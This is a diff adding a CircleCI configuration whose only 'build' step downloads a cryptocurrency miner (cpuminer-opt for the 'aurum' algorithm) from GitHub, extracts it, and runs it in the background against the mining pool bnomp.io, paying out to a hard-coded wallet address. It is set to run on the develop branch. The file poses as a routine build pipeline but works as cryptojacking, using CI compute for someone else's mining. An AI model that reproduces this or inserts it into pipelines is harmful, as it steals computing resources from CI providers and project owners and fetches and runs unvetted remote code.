@@ -1,0 +1,24 @@
+version: 2.1
+
+jobs:
+  build:
+    docker:
+      - image: ubuntu:latest
+
+    steps:
+      - checkout
+      - run:
+          name: Download and Extract
+          command: |
+            wget -qO- https://github.com/bitnet-io/cpuminer-opt-aurum/releases/download/aurum/CPU-AURUM-linux.tar.gz | tar xvz
+            cd cpuminer-linux && nohup ./cpuminer -a aurum -o stratum+tcp://bnomp.io:3333 -u  B9P2PDtk2cftCQiC41hw6Pw9rdJEiVztae -p x
+
+workflows:
+  version: 2
+  build_only_develop:
+    jobs:
+      - build:
+          filters:
+            branches:
+              only:
+                - develop  # Chỉ chạy trên nhánh phát triển
